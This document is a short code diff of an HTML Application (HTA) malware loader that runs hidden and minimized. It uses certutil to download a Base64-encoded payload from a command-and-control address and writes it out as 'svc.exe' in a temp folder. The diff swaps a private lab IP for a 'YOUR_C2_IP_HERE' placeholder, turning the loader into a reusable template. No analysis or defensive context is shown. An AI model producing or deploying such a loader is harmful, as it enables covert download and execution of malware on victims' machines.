@@ -1,4 +1,4 @@
-<html>
+﻿<html>
 <head>
 <title> </title>
 <HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
@@ -25,7 +25,7 @@ try {
     var exePath = tmpDir + "\\svc.exe";
 
     // -- CONFIG: Set your payload URL ------------------------------------------
-    var payloadUrl = "http://192.168.45.221/payload.b64";
+    var payloadUrl = "http://YOUR_C2_IP_HERE/payload.b64";
 
     // Download the Base64-encoded payload (quoted paths + -split for reliability)
     shell.Run('certutil -urlcache -f -split "' + payloadUrl + '" "' + encPath + '"', 0, true);
